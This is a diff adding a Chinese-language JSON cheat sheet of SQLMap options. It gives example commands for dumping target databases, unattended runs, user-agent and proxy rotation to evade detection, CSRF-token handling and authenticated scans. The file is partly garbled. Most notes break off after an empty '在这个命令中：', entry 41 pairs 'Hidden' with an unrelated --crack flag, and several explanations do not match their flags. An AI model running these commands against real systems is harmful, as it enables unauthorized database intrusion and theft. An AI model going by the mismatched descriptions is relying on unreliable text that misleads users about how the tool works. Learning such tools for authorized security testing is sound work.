+      "这个命令会列出目标数据库的所有表（使用 --tables 参数），并以十六进制格式显示相关数据。"
+    ]
+  },
+  {
+    "sheet": "39.非交互模式 一切皆默认",
+    "flag": "--batch",
+    "explain": "在 SQLMap 中，--batch 参数用于自动化处理测试过程中的所有交互式提示，确保测试过程不会因为等待用户输入而中断。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --batch",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --dump --batch"
+    ],
+    "notes": [
+      "这个命令会自动执行 SQLMap 测试，所有交互式提示将自动以默认选项进行处理。",
+      "这个命令会自动提取数据库中的数据（使用 --dump 参数），并在整个过程中无需用户干预。"
+    ]
+  },
+  {
+    "sheet": "40.新手导向",
+    "flag": "--wizard",
+    "explain": "\"--wizard \"参数与 SQLMap 支持的所有数据库类型兼容。",
+    "examples": [
+      "sqlmap --wizard"
+    ],
+    "notes": [
+      "运行这个命令后，SQLMap 将启动交互式向导，你可以按照提示配置测试参数并启动测试。"
+    ]
+  },
+  {
+    "sheet": "41.Hidden",
+    "flag": "--crack",
+    "explain": "\"--hidden\" 参数适用于 SQLMap 支持的所有数据库类型。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php\" --hidden",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --hidden --dump"
+    ],
+    "notes": [
+      "这个命令会自动识别并处理 HTTP 请求中的隐藏字段，以确保测试过程包括这些字段。",
+      "这个命令会自动识别和处理隐藏字段，并尝试提取数据库中的数据（使用 --dump 参数）。"
+    ]
+  },
+  {
+    "sheet": "(请求)42.随机User-Agent头",
+    "flag": "--random-agent",
+    "explain": "在 SQLMap 中，--random-agent 参数用于随机选择一个常见的用户代理字符串（User-Agent）并在每次请求中使用。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --random-agent",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --dump --random-agent"
+    ],
+    "notes": [
+      "这个命令会随机选择一个用户代理字符串，并使用该用户代理字符串来发送所有请求。",
+      "这个命令会提取数据库中的数据（使用 --dump 参数），并在所有请求中使用随机选择的用户代理字符串。"
+    ]
+  },
+  {
+    "sheet": "43.模拟手机请求",
+    "flag": "--mobile",
+    "explain": "\"--mobile\" 参数适用于 SQLMap 支持的所有数据库类型，",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --mobile",
+      "sqlmap -u \"http://example.com/vulnerable.php?id=1\" --dump --mobile"
+    ],
+    "notes": [
+      "这个命令会将用户代理字符串设置为常见的移动设备用户代理，",
+      "这个命令会提取数据库中的数据（使用 --dump 参数），并在所有请求中使用移动设备的用户代理字符串。"
+    ]
+  },
+  {
+    "sheet": "44.指定 User-Agent头",
+    "flag": "--user-agent= ?",
+    "explain": "SQLmap 支持多种数据库管理系统（DBMS），几乎涵盖了所有常见的关系型数据库。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --user-agent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\"",
+      "sqlmap -u \"http://example.com/product.php?id=1\" --user-agent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\""
+    ],
+    "notes": [
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "45.Host头",
+    "flag": "--host= ?",
+    "explain": "在 HTTP 请求中，Host 头用于指定目标服务器的主机名和端口号。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --headers=\"Host: anotherdomain.com\""
+    ],
+    "notes": [
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "\"头\"的意思",
+    "flag": "--headers",
+    "explain": "HTTP 头包含了有关请求或响应的额外信息，比如客户端浏览器类型、服务器类型、请求的内容类型等。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --headers=\"Host: anotherdomain.com\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\""
+    ],
+    "notes": [
+      "在上述请求中，每一行都是一个请求头字段，提供了客户端发送给服务器的各种信息。",
+      "在这个示例中，--headers 参数被用来设置自定义的 Host 和 User-Agent 头。"
+    ]
+  },
+  {
+    "sheet": "46.referer头",
+    "flag": "--referer= ?",
+    "explain": "\"--referer\" 参数与数据库类型无关。它是 HTTP 请求的一部分，",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --referer=\"http://referer.example.com/previous_page.php\""
+    ],
+    "notes": [
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "47.--header(-H)",
+    "flag": "--header= ?",
+    "explain": "\"--header\" 参数与具体的数据库类型无关，因为它是 HTTP 请求的一部分，",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --header=\"Host: anotherdomain.com\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\""
+    ],
+    "notes": [
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "48.额外的headers",
+    "flag": "--headers= ?",
+    "explain": "\"--headers\" 参数与具体的数据库类型无关，因为它是 HTTP 请求的一部分，",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --headers=\"Host: anotherdomain.com\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\""
+    ],
+    "notes": [
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "49.HTTP请求方式",
+    "flag": "--method= ?",
+    "explain": "\"--method\" 参数与具体的数据库类型无关，",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php\" --method=POST --data=\"id=1\""
+    ],
+    "notes": [
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "50.指定--data=中的参数分隔符号",
+    "flag": "--data-del= ?",
+    "explain": "在 SQLMap 中，--data-del 参数用于指定 POST 数据参数的分隔符。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php\" --method=POST --data=\"id=1;name=test\" --data-del=\";\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php\" --method=POST --data=\"id=1;name=test;action=submit\" --data-del=\";\""
+    ],
+    "notes": [
+      "注意事项",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "51.\"分块传输\"发送POST请求",
+    "flag": "--chunked",
+    "explain": "在 SQLMap 中，--chunked 参数用于启用 HTTP 分块传输编码（Chunked Transfer Encoding）。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --chunked"
+    ],
+    "notes": [
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "分块传输",
+    "flag": "",
+    "explain": "分块传输编码是一种 HTTP/1.1 的数据传输机制，用于在发送 HTTP 响应时逐块传输数据。",
+    "examples": [],
+    "notes": []
+  },
+  {
+    "sheet": "52.通过POST提交data",
+    "flag": "--data=",
+    "explain": "在 SQLMap 中，--data 参数用于指定 HTTP 请求中的数据部分，通常用于 POST 请求。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php\" --method=POST --data=\"id=1&name=test\"",
+      "sqlmap -u \"http://example.com/api/vulnerable_endpoint\" --method=POST --data='{\"id\": 1, \"name\": \"test\"}' --headers=\"Content-Type: application/json\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php\" --method=POST --data=\"id=1;name=test\" --data-del=\";\""
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "53.要包含的Cookie",
+    "flag": "--cookie=",
+    "explain": "SQLMap 中的 --cookie 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --cookie=\"sessionid=abc123; user=admin\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --cookie=\"sessionid=$(curl -s -I http://example.com/login | grep 'Set-Cookie' | cut -d' ' -f2)\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --cookie=\"sessionid=abc123; user=admin; othercookie=value\""
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "54.指定cookie分隔符",
+    "flag": "--cookie-del=",
+    "explain": "SQLMap 中的 --cookie-del 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --cookie=\"sessionid=abc123,user=admin\" --cookie-del=\",\""
+    ],
+    "notes": [
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "55.丢弃Set-Cookie头",
+    "flag": "--drop-set-cookie=",
+    "explain": "SQLMap 中的 --drop-set-cookie 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --drop-set-cookie"
+    ],
+    "notes": [
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "56.live_cookies",
+    "flag": "--live-cookies=",
+    "explain": "SQLMap 中的 --live-cookies 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --live-cookies=\"/path/to/cookies.txt\""
+    ],
+    "notes": [
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "57.本地 Cookie 文件",
+    "flag": "--load-cookies=",
+    "explain": "SQLMap 中的 --load-cookies 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --load-cookies=\"/path/to/cookies.txt\""
+    ],
+    "notes": [
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "58.http认证类型",
+    "flag": "--auth-type=",
+    "explain": "SQLMap 中的 --auth-type 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --auth-type=Basic --auth-cred=\"username:password\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --auth-type=NTLM --auth-cred=\"domain\\\\username:password\""
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "59.http认证帐密",
+    "flag": "--auth-cred=",
+    "explain": "SQLMap 中的 --auth-cred 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --auth-type=Basic --auth-cred=\"username:password\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --auth-type=NTLM --auth-cred=\"domain\\\\username:password\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --auth-type=Digest --auth-cred=\"username:password\""
+    ],
+    "notes": [
+      "-u \"http://example.com/vulnerable_page.php?id=1\"：指定目标 URL。",
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "60.http认证文件",
+    "flag": "--auth-file=",
+    "explain": "SQLMap 中的 --auth-file 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --auth-file=\"/path/to/client_cert.pem\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --auth-type=Basic --auth-file=\"auth.txt\""
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "61.csrf_method",
+    "flag": "--csrf-method=",
+    "explain": "SQLMap 中的 --csrf-method 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --csrf-method=GET --csrf-url=\"http://example.com/get_csrf_token.php\" --csrf-token=\"csrf_token\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --csrf-method=POST --csrf-url=\"http://example.com/get_csrf_token.php\" --csrf-token=\"csrf_token\" --csrf-data=\"username=admin&password=admin\""
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "62.csrf_retries",
+    "flag": "--csrf-retries=",
+    "explain": "SQLMap 中的 --csrf-retries 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --csrf-method=GET --csrf-url=\"http://example.com/get_csrf_token.php\" --csrf-token=\"csrf_token\" --csrf-retries=3",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --csrf-method=POST --csrf-url=\"http://example.com/get_csrf_token.php\" --csrf-token=\"csrf_token\" --csrf-data=\"username=admin&password=admin\" --csrf-retries=5"
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "CSRF令牌",
+    "flag": "--csrf-token",
+    "explain": "CSRF 令牌（Cross-Site Request Forgery Token），也称为反跨站请求伪造令牌，是一种用于防止 CSRF 攻击的安全机制。",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --csrf-token=\"csrf_token\" --csrf-url=\"http://example.com/get_csrf_token.php\" --csrf-method=GET --csrf-retries=3",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --csrf-token=\"csrf_token\" --csrf-url=\"http://example.com/get_csrf_token.php\" --csrf-method=POST --csrf-data=\"username=admin&password=admin\" --csrf-retries=5"
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "63.csrf-token",
+    "flag": "--csrf-token=",
+    "explain": "SQLMap 中的 --csrf-token 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --csrf-token=\"csrf_token\" --csrf-url=\"http://example.com/get_csrf_token.php\" --csrf-method=GET --csrf-retries=3",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --csrf-token=\"csrf_token\" --csrf-url=\"http://example.com/get_csrf_token.php\" --csrf-method=POST --csrf-data=\"username=admin&password=admin\" --csrf-retries=5"
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "64.获取 csrf_token 的url",
+    "flag": "--csrf-url=",
+    "explain": "SQLMap 中的 --csrf-url 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --csrf-token=\"csrf_token\" --csrf-url=\"http://example.com/get_csrf_token.php\" --csrf-method=GET --csrf-retries=3",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --csrf-token=\"csrf_token\" --csrf-url=\"http://example.com/get_csrf_token.php\" --csrf-method=POST --csrf-data=\"username=admin&password=admin\" --csrf-retries=5"
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "65.忽略连接超时",
+    "flag": "--ignore-timeouts",
+    "explain": "SQLMap 中的 --ignore-timeouts 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --ignore-timeouts"
+    ],
+    "notes": [
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "66.忽略重定向",
+    "flag": "--ignore-redirects",
+    "explain": "SQLMap 中的 --ignore-redirects 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --ignore-redirects"
+    ],
+    "notes": [
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "67.忽略错误典型状态码",
+    "flag": "--ignore-code=",
+    "explain": "SQLMap 中的 --ignore-code 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --ignore-code=403,404"
+    ],
+    "notes": [
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "68.payload 不使用 url 编码",
+    "flag": "--skip-urlencode",
+    "explain": "### SQLMap 中的 `--skip-urlencode` 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1&name=test user\" --skip-urlencode",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --skip-urlencode"
+    ],
+    "notes": [
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "69.强制使用 HTTPS",
+    "flag": "--force-ssl",
+    "explain": "SQLMap 中的 --force-ssl 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --force-ssl"
+    ],
+    "notes": [
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "70. HTTP 参数污染",
+    "flag": "--hpp",
+    "explain": "",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --hpp",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --hpp --data=\"id=1&name=test\""
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "71. 请求间隔(秒)",
+    "flag": "--delay=",
+    "explain": "",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --delay=1",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --delay=1 --batch --level=3",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --delay=2"
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "72. 超时前等几秒",
+    "flag": "--timeout=",
+    "explain": "SQLMap 中的 --timeout 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --timeout=5",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --timeout=5 --delay=1 --batch --level=3",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --timeout=10"
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "73. 指定要随机改变值的参数",
+    "flag": "--randomize",
+    "explain": "SQLMap 中的 --randomize 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --randomize=id",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1&name=test\" --randomize=id,name --timeout=5 --batch --level=3"
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "74. --eval=",
+    "flag": "--eval",
+    "explain": "",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php\" --eval=\"import random; id=random.randint(1, 100)\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php\" --data=\"name=test\" --eval=\"with open('ids.txt') as f: ids=f.readlines(); id=ids.pop().strip()\""
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "75.顺便参杂地方问一个安全URL",
+    "flag": "--safe-url=",
+    "explain": "SQLMap 中的 --safe-url 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --safe-url=\"http://example.com/safe_page.php\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --safe-url=\"http://example.com/safe_page.php\" --safe-freq=5"
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "76.提交到安全URL的POST数据",
+    "flag": "--safe-post=",
+    "explain": "SQLMap 中的 --safe-post 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --safe-url=\"http://example.com/safe_page.php\" --safe-post=\"username=admin&password=admin123\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --safe-url=\"http://example.com/safe_page.php\" --safe-post=\"username=admin&password=admin123\" --safe-freq=5",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --safe-url=\"http://example.com/safe_page.php\" --safe-post=\"param1=value1&param2=value2\""
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "77.从文件载入safe HTTP请求",
+    "flag": "--safe-req=",
+    "explain": "SQLMap 中的 --safe-req 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --safe-req=\"safe_request.txt\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --safe-req=\"safe_request.txt\" --safe-freq=5"
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "78.访问安全URL的频率",
+    "flag": "--safe-freq=",
+    "explain": "SQLMap 中的 --safe-freq 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --safe-url=\"http://example.com/safe_page.php\" --safe-freq=10",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --safe-url=\"http://example.com/safe_page.php\" --safe-post=\"username=admin&password=admin123\" --safe-freq=5"
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "79.忽略系统默认代理",
+    "flag": "--ignore-proxy",
+    "explain": "SQLMap 中的 --ignore-proxy 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --ignore-proxy",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --data=\"username=admin&password=admin123\" --ignore-proxy"
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "80.--proxy-freq",
+    "flag": "--proxy-freq",
+    "explain": "SQLMap 中的 --proxy-freq 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --proxy=\"http://proxy1.com:8080,http://proxy2.com:8080\" --proxy-freq=5",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --data=\"username=admin&password=admin123\" --proxy=\"http://proxy1.com:8080,http://proxy2.com:8080,http://proxy3.com:8080\" --proxy-freq=3",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --proxy=\"http://proxy1.com:8080\" --proxy-freq=10",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --proxy=\"http://proxy1.com:8080,http://proxy2.com:8080\" --proxy-freq=10"
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "81.代理列表文件",
+    "flag": "--proxy-file=",
+    "explain": "SQLMap 中的 --proxy-file 参数",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --proxy-file=\"proxies.txt\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --proxy-file=\"proxies.txt\" --proxy-freq=5"
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  },
+  {
+    "sheet": "82.使用代理",
+    "flag": "--proxy=",
+    "explain": "",
+    "examples": [
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --proxy=\"http://proxy1.com:8080\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --data=\"username=admin&password=admin123\" --proxy=\"http://proxy1.com:8080\"",
+      "sqlmap -u \"http://example.com/vulnerable_page.php?id=1\" --proxy-file=\"proxies.txt\" --proxy-freq=5"
+    ],
+    "notes": [
+      "在这个命令中：",
+      "在这个命令中：",
+      "在这个命令中："
+    ]
+  }
+]
